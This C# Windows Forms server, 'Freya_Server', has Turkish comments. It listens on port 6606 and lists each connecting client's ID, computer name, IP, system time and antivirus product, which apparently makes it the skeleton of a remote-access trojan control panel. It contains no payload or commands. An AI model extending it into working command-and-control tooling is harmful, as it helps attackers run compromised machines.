using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Freya_Server
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            connectedClients = new List<TcpClient>();
        }


        #region Server Setup

        private TcpListener tcpListener;
        private List<TcpClient> connectedClients;
        private Thread listenerThread;


        private void StartServer()
        {
            tcpListener = new TcpListener(IPAddress.Any, 6606);
            listenerThread = new Thread(new ThreadStart(ListenForClients));
            listenerThread.Start();
        }

        private void ListenForClients()
        {
            tcpListener.Start();

            while (true)
            {
                // Bloke edilmeyen bir şekilde bir istemciyi kabul et
                if (tcpListener.Pending())
                {
                    TcpClient client = tcpListener.AcceptTcpClient();

                    // İstemci bağlandığında listView1'e ekleyin
                    this.Invoke((MethodInvoker)delegate {
                        listView1.Items.Add(new ListViewItem(new string[] { "", "", "", "", "" }));
                    });

                    connectedClients.Add(client);

                    // İstemci ile iletişim kurmak için bir iş parçacığı başlatın
                    Thread clientThread = new Thread(new ParameterizedThreadStart(HandleClientComm));
                    clientThread.Start(client);
                }

                Thread.Sleep(100); // Dinlenen bağlantıları kontrol etmek için bekleme
            }
        }


        private void HandleClientComm(object clientObj)
        {
            TcpClient tcpClient = (TcpClient)clientObj;
            NetworkStream clientStream = tcpClient.GetStream();
            byte[] message = new byte[4096];
            int bytesRead;

            try
            {
                // İstemciden gelen veriyi oku
                bytesRead = clientStream.Read(message, 0, 4096);
                string receivedMessage = Encoding.UTF8.GetString(message, 0, bytesRead);

                // İstemciden gelen bilgileri ayrıştır
                string[] clientInfo = receivedMessage.Split('|');

                // İstemci bilgilerini listView1'e ekleyin
                this.Invoke((MethodInvoker)delegate {
                    ListViewItem item = listView1.Items[connectedClients.IndexOf(tcpClient)];
                    item.SubItems[0].Text = clientInfo[0]; // Client ID
                    item.SubItems[1].Text = clientInfo[1]; // Bilgisayar Adı
                    item.SubItems[2].Text = clientInfo[2]; // IP Adresi
                    item.SubItems[3].Text = clientInfo[3]; // Sistem Zamanı
                    item.SubItems[4].Text = clientInfo[4]; // Antivirüs
                });
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error handling client communication: " + ex.Message);
            }

            tcpClient.Close();
        }
        private void button2_Click(object sender, EventArgs e)
        {
            StartServer();
        }

        #endregion


        private void button1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

            #region listView
            listView1.MultiSelect = false; // Yalnızca tek bir satır seçilecek
            listView1.FullRowSelect = true;

            listView1.HeaderStyle = ColumnHeaderStyle.None;

            listView1.Columns[0].AutoResize(ColumnHeaderAutoResizeStyle.None);
            listView1.Columns[0].Width = 210;

            listView1.Columns[1].AutoResize(ColumnHeaderAutoResizeStyle.None);
            
            listView1.Columns[1].Width = 210;

            listView1.Columns[2].AutoResize(ColumnHeaderAutoResizeStyle.None);
            listView1.Columns[2].Width = 210;

            listView1.Columns[3].AutoResize(ColumnHeaderAutoResizeStyle.None);
            listView1.Columns[3].Width = 210;

            listView1.Columns[4].AutoResize(ColumnHeaderAutoResizeStyle.None);
            listView1.Columns[4].Width = 216;

            #endregion



        }


    }
}
